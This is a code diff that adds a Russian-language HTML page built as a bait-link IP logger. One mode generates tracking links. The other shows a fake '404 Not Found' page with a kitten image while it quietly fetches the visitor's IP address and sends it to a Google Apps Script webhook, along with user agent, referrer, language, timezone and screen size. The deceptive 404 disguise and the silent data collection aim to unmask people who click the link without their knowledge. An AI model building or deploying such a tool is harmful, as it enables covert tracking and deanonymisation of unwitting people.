@@ -1,0 +1,86 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>404 Not Found</title>
+<script>
+// ==== КОНФИГ ====
+window.CFG = {
+  kitten: "https://avatars.mds.yandex.net/i?id=01fb0c5c4c152ff011088773f851c8208163d690-12992035-images-thumbs&n=13",
+  ipEcho: "https://api.ipify.org?format=json",
+  webhook: "https://script.google.com/macros/s/XXXX/exec",
+  ownerKey: "смени_этот_ключ"
+};
+</script>
+</head>
+<body style="font-family:monospace;margin:0">
+<div id="gen" style="display:none;padding:24px">
+  <h3>Генератор приманок</h3>
+  <input id="label" placeholder="метка" style="width:320px;padding:6px">
+  <button onclick="gen()" style="padding:6px 12px">Сгенерировать</button>
+  <p id="out" style="word-break:break-all"></p>
+</div>
+
+<div id="trap" style="display:none;text-align:center;padding:40px">
+  <h1>404 Not Found</h1>
+  <p>Запрашиваемый ресурс недоступен.</p>
+  <img id="k" alt="" style="max-width:520px;border-radius:8px">
+</div>
+
+<script>
+function b64e(s){return btoa(unescape(encodeURIComponent(s))).replace(/=+$/,'')}
+function b64d(s){try{return JSON.parse(decodeURIComponent(escape(atob(s))))}catch(e){return null}}
+
+const hash = location.hash.slice(1);
+const meta = hash ? b64d(hash) : null;
+
+if(!meta){
+  // ---- режим генератора ----
+  document.getElementById("gen").style.display = "block";
+  window.gen = function(){
+    const key = prompt("owner key");
+    if(key !== CFG.ownerKey){ alert("нет доступа"); return; }
+    const label = document.getElementById("label").value || "приманка";
+    const slug = Math.random().toString(36).slice(2,10);
+    const base = location.href.split("#")[0];
+    const url = base + "#" + b64e(JSON.stringify({s:slug,l:label,t:Date.now()}));
+    document.getElementById("out").innerHTML = '<a href="'+url+'">'+url+'</a>';
+  };
+} else {
+  // ---- режим приманки ----
+  document.title = "404 Not Found";
+  document.getElementById("trap").style.display = "block";
+  document.getElementById("k").src = CFG.kitten;
+
+  (async () => {
+    let ip = "?";
+    try{
+      const r = await fetch(CFG.ipEcho, {cache:"no-store"});
+      const j = await r.json();
+      ip = j.ip || "?";
+    }catch(e){}
+
+    const payload = {
+      slug: meta.s, label: meta.l,
+      ip: ip,
+      ua: navigator.userAgent,
+      ref: document.referrer || "",
+      lang: navigator.language,
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screen: screen.width + "x" + screen.height,
+      ts: new Date().toISOString()
+    };
+
+    try{
+      await fetch(CFG.webhook, {
+        method:"POST", mode:"no-cors",
+        headers:{"Content-Type":"text/plain;charset=utf-8"},
+        body: JSON.stringify(payload)
+      });
+    }catch(e){}
+  })();
+}
+</script>
+</body>
+</html>
